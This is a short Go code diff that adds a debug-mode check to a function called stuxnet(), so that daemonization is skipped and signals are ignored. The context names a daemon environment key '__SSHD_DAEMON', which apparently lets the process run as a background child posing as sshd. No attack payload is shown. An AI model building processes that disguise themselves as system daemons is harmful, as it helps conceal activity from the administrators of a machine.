@@ -239,6 +239,12 @@ const daemonEnvKey = "__SSHD_DAEMON"
 //
 
 func stuxnet() {
+	// Skip daemonization in debug mode so output stays in the terminal.
+	if debugMode {
+		ignoreSignals()
+		return
+	}
+
 	// Already the daemon child – just finish housekeeping.
 	if os.Getenv(daemonEnvKey) == "1" {
 		daemonHousekeep()
